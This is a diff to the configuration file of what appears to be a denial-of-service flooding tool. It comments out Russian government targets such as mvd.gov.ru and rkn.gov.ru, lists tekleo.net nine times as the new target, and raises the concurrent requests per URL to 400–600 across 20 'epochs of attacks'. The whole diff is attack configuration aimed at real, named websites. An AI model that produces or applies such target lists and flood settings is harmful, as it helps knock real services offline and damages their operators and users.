@@ -128,12 +128,21 @@ LIST_OF_URLS = [
     # "https://maxima-logistic.ru/",
     # "https://maxima-logistic.ru/company/news/company/6291/",
     # "https://maxima-logistic.ru/personal/auth/",
-    "https://mail.rkn.gov.ru/",
-    "https://cloud.rkn.gov.ru/",
-    "https://mvd.gov.ru/",
-    "https://pwd.wto.economy.gov.ru/",
-    "https://stroi.gov.ru/",
-    "https://proverki.gov.ru/",
+    # "https://mail.rkn.gov.ru/",
+    # "https://cloud.rkn.gov.ru/",
+    # "https://mvd.gov.ru/",
+    # "https://pwd.wto.economy.gov.ru/",
+    # "https://stroi.gov.ru/",
+    # "https://proverki.gov.ru/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
+    "https://tekleo.net/",
 ]
 
 # How many cycles (epochs) of attacks should be performed
@@ -144,8 +153,8 @@ NUMBER_OF_EPOCHS = 20
 PARALLEL_LIST_OF_URLS_WORKERS = 2
 
 # Min/max values that determine how many requests can be simultaneously sent to a single URL
-PARALLEL_SINGLE_URL_MIN_REQUESTS = 150
-PARALLEL_SINGLE_URL_MAX_REQUESTS = 400
+PARALLEL_SINGLE_URL_MIN_REQUESTS = 400
+PARALLEL_SINGLE_URL_MAX_REQUESTS = 600
 
 # How many requests on the same URL will be processed in parallel
 PARALLEL_SINGLE_URL_WORKERS = 50
